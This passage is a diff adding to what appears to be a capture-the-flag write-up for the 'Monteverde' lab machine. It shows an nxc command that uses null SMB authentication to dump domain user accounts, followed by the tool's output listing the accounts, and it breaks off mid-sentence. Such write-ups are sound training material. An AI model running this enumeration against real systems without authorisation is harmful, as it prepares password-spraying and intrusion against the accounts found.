@@ -75,3 +75,26 @@ Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 # SMB (445)
 
+## Null authentication
+
+### Users
+```python
+nxc smb monteverde.megabank.local -u '' -p '' --users-export users.txt
+SMB         10.129.35.54    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.35.54    445    MONTEVERDE       [+] MEGABANK.LOCAL\: 
+SMB         10.129.35.54    445    MONTEVERDE       -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         10.129.35.54    445    MONTEVERDE       Guest                         <never>             0       Built-in account for guest access to the computer/domain 
+SMB         10.129.35.54    445    MONTEVERDE       AAD_987d7f2f57d2              2020-01-02 22:53:24 0       Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
+SMB         10.129.35.54    445    MONTEVERDE       mhope                         2020-01-02 23:40:05 0        
+SMB         10.129.35.54    445    MONTEVERDE       SABatchJobs                   2020-01-03 12:48:46 0        
+SMB         10.129.35.54    445    MONTEVERDE       svc-ata                       2020-01-03 12:58:31 0        
+SMB         10.129.35.54    445    MONTEVERDE       svc-bexec                     2020-01-03 12:59:55 0        
+SMB         10.129.35.54    445    MONTEVERDE       svc-netapp                    2020-01-03 13:01:42 0        
+SMB         10.129.35.54    445    MONTEVERDE       dgalanos                      2020-01-03 13:06:10 0        
+SMB         10.129.35.54    445    MONTEVERDE       roleary                       2020-01-03 13:08:05 0        
+SMB         10.129.35.54    445    MONTEVERDE       smorgan                       2020-01-03 13:09:21 0        
+SMB         10.129.35.54    445    MONTEVERDE       [*] Enumerated 10 local users: MEGABANK
+SMB         10.129.35.54    445    MONTEVERDE       [*] Writing 10 local users to users.txt
+```
+
+I have dumped all the user to a file using null authentication, but im not able to use null auth to access sha
